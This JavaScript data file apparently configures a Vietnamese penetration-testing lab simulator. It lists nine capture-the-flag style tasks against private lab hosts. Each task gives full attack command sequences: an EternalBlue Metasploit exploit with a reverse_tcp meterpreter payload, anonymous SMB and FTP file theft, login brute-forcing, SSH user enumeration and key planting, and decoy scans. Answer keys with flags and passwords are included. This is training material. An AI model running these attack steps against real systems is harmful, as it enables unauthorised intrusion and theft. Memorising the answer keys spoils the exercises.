window.LabData = window.LabData || {};

window.LabData.SCENARIOS = {
  scan: {
    id: "scan",
    name: "Task 1: Quét mạng (Recon)",
    description: "Khám phá các host đang hoạt động và dịch vụ SMB trong dải 192.168.202.0/24",
    targetNode: "all",
    commands: [
      "nmap -sn 192.168.202.0/24",
      "nmap -sV -p 139,445 192.168.202.137",
      "nmap -sV -p 139,445 192.168.202.136"
    ],
    question: "Có bao nhiêu host đang hoạt động (Up) trong mạng?",
    placeholder: "Nhập số lượng host (VD: 3)...",
    answers: ["3", "3 hosts"],
    hint: "Chạy lệnh nmap -sn 192.168.202.0/24 và xem dòng cuối '3 hosts up'."
  },
  vuln: {
    id: "vuln",
    name: "Task 2: Phát hiện lỗ hổng",
    description: "Kiểm tra lỗ hổng MS17-010 (EternalBlue) trên Win7 và Anonymous Share trên Ubuntu",
    targetNode: "both",
    commands: [
      "nmap -p445 --script smb-vuln-ms17-010 192.168.202.137",
      "enum4linux -a 192.168.202.136"
    ],
    question: "Mã CVE của lỗ hổng SMB trên máy Windows 7 là gì?",
    placeholder: "VD: CVE-2017-xxxx",
    answers: ["cve-2017-0143", "cve:cve-2017-0143", "ms17-010"],
    hint: "Quét script smb-vuln-ms17-010 trên IP .137 và tìm dòng 'IDs: CVE:...'."
  },
  smb_ubuntu: {
    id: "smb_ubuntu",
    name: "Task 3: Khai thác Ubuntu (SMB)",
    description: "Truy cập trái phép thư mục chia sẻ không mật khẩu và đánh cắp secret.txt",
    targetNode: "ubuntu",
    commands: [
      "smbclient -L 192.168.202.136 -N",
      "smbclient //192.168.202.136/public -N",
      "ls",
      "get secret.txt",
      "exit"
    ],
    question: "Nội dung (Flag) bên trong file secret.txt là gì?",
    placeholder: "Nhập nội dung file secret.txt...",
    answers: ["day la file bi lo hong smb", "\"day la file bi lo hong smb\""],
    hint: "Kết nối vào //192.168.202.136/public -N rồi dùng lệnh 'get secret.txt'."
  },
  msf_win7: {
    id: "msf_win7",
    name: "Task 4: Khai thác Win7 (MS17-010)",
    description: "Chiếm quyền điều khiển SYSTEM trên Windows 7 qua Metasploit EternalBlue",
    targetNode: "win7",
    commands: [
      "msfconsole",
      "use exploit/windows/smb/ms17_010_psexec",
      "set RHOSTS 192.168.202.137",
      "set LHOST 192.168.202.132",
      "set PAYLOAD windows/meterpreter/reverse_tcp",
      "set SMBUser hacker",
      "set SMBPass 1234",
      "exploit",
      "getuid",
      "sysinfo",
      "shell",
      "whoami",
      "net user"
    ],
    question: "Quyền (username) chiếm được khi chạy getuid / whoami là gì?",
    placeholder: "VD: NT AUTHORITY\\SYSTEM",
    answers: ["nt authority\\system", "system"],
    hint: "Sau khi exploit mở phiên meterpreter >, chạy lệnh 'getuid' hoặc 'whoami'."
  },
  ftp_audit: {
    id: "ftp_audit",
    name: "Task 5: Khảo sát FTP & Đánh giá Phân quyền (Port 21/80)",
    description: "Quét Banner, kiểm tra lỗi ftp-anon và đăng nhập trực tiếp ftp> đối chứng quyền Đọc (READ) / Ghi (WRITE)",
    targetNode: "both",
    commands: [
      "nmap -p 21,80 -sV --script=banner,ftp-syst 192.168.202.136 192.168.202.137",
      "nmap -sC -sV -Pn -p 21,80 --max-rtt-timeout 1000ms -T2 192.168.202.136",
      "nmap -p 21 --script=ftp-anon 192.168.202.136",
      "ftp 192.168.202.136",
      "ls",
      "get tai_lieu_noi_bo.txt",
      "put /etc/issue test_ghi.txt",
      "bye"
    ],
    question: "Khi thử tải tệp lên FTP (put), máy chủ trả về mã lỗi số mấy?",
    placeholder: "VD: 550 (hoặc vsftpd 3.0.5)",
    answers: ["550", "550 permission denied", "vsftpd 3.0.5", "3.0.5"],
    hint: "Chạy 'put /etc/issue test_ghi.txt' trong ftp> để kiểm tra quyền WRITE (550 Permission denied)."
  },
  ftp_web_chain: {
    id: "ftp_web_chain",
    name: "Task 6: Khai thác Rò rỉ FTP & Xâm nhập Web (Crocodile)",
    description: "Trích xuất allowed.userlist(.passwd) từ FTP, phân tích thông tin xác thực, kiểm thử /login.php và lấy Flag tại /dashboard.php",
    targetNode: "ubuntu",
    commands: [
      "ftp 192.168.202.136",
      "ls",
      "get allowed.userlist",
      "get allowed.userlist.passwd",
      "bye",
      "cat allowed.userlist",
      "cat allowed.userlist.passwd",
      "paste allowed.userlist allowed.userlist.passwd",
      "nmap -p 80 --script=http-enum 192.168.202.136",
      'nmap -p 80 --script=http-methods,http-title --script-args "http-methods.url-path=/login.php" 192.168.202.136',
      'nmap -p 80 --script=http-form-brute --script-args "http-form-brute.path=/login.php,userdb=allowed.userlist,passdb=allowed.userlist.passwd" 192.168.202.136',
      'curl -s -b "PHPSESSID=9c41f08a2d5e11b7" http://192.168.202.136/dashboard.php | grep -i flag'
    ],
    question: "Mã HTB_FLAG thu được từ trang /dashboard.php là gì?",
    placeholder: "Nhập chuỗi hash HTB_FLAG...",
    answers: ["c7110277ac44d78b6a9fff2232434d16", "htb_flag: c7110277ac44d78b6a9fff2232434d16"],
    hint: "Tải allowed.userlist & allowed.userlist.passwd qua ftp -> chạy http-form-brute -> dùng curl lấy flag."
  },
  ssh_enum: {
    id: "ssh_enum",
    name: "Task 7: Liệt kê User SSH (Port 22)",
    description: "Dò quét tài khoản tồn tại trên dịch vụ OpenSSH của Ubuntu (.136) bằng module ssh_enumusers",
    targetNode: "ubuntu",
    commands: [
      "msfconsole",
      "use auxiliary/scanner/ssh/ssh_enumusers",
      "set RHOSTS 192.168.202.136",
      "set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt",
      "set ACTION Timing Attack",
      "run",
      "exit"
    ],
    question: "Tài khoản người dùng nào được tìm thấy trên dịch vụ SSH (.136)?",
    placeholder: "Nhập tên user tìm thấy...",
    answers: ["vboxuser"],
    hint: "Chạy module auxiliary/scanner/ssh/ssh_enumusers và xem dòng [+] User '...' found."
  },
  ssh_pubkey: {
    id: "ssh_pubkey",
    name: "Task 8: Xác thực SSH Private Key (Port 22)",
    description: "Tạo cặp khóa RSA, cấy khóa công khai và chiếm phiên SSH không mật khẩu qua ssh_login_pubkey",
    targetNode: "ubuntu",
    commands: [
      'ssh-keygen -t rsa -f /home/kali/leaked_key -N ""',
      "ssh-copy-id -i /home/kali/leaked_key.pub vboxuser@192.168.202.136",
      "msfconsole",
      "use auxiliary/scanner/ssh/ssh_login_pubkey",
      "set RHOSTS 192.168.202.136",
      "set USERNAME vboxuser",
      "set KEY_PATH /home/kali/leaked_key",
      "run",
      "sessions -i 1",
      "whoami",
      "id"
    ],
    question: "Sau khi mở phiên SSH (sessions -i 1), user vboxuser thuộc nhóm quyền quản trị nào?",
    placeholder: "VD: sudo (hoặc uid=1000)",
    answers: ["sudo", "27(sudo)", "vboxuser"],
    hint: "Chạy lệnh 'id' bên trong phiên SSH vừa mở và xem mục groups=..."
  },
  web_recon_exploit: {
    id: "web_recon_exploit",
    name: "Task 9: Trinh sát Mạng & Khai thác Web (Port 80)",
    description: "Quét cổng nhanh, vượt tường lửa chặn Ping bằng TCP SYN + Decoy, dò tìm thư mục /admin/ và trích xuất pass.txt",
    targetNode: "ubuntu",
    commands: [
      "sudo nmap -n -F --open 192.168.202.136",
      "sudo nmap -sn -n --send-ip --packet-trace 192.168.202.136",
      "sudo nmap -sn -n -PS80 -D 192.168.202.50,192.168.202.60 --send-ip --packet-trace 192.168.202.136",
      'sudo nmap -n -p 80 -sV --script "http-headers,http-title" 192.168.202.136',
      "sudo nmap -n -p 80 --script http-enum 192.168.202.136",
      "curl http://192.168.202.136/admin/pass.txt"
    ],
    question: "Mật khẩu của tài khoản admin bị lộ trong file /admin/pass.txt là gì?",
    placeholder: "Nhập mật khẩu tìm thấy...",
    answers: ["123456@abc", "tai khoan: admin | mat khau: 123456@abc"],
    hint: "Dò thư mục bằng script http-enum rồi dùng 'curl http://192.168.202.136/admin/pass.txt'."
  }
};

window.LabData.SHELL_PROMPTS = {
  kali: { text: "kali@kali:~$", cssClass: "" },
  smb: { text: "smb: \\>", cssClass: "smb" },
  msf: { text: "msf6 >", cssClass: "msf" },
  msf_exploit: { text: "msf6 exploit(windows/smb/ms17_010_psexec) >", cssClass: "msf" },
  meterpreter: { text: "meterpreter >", cssClass: "msf" },
  cmd: { text: "C:\\Windows\\system32>", cssClass: "cmd" }
};
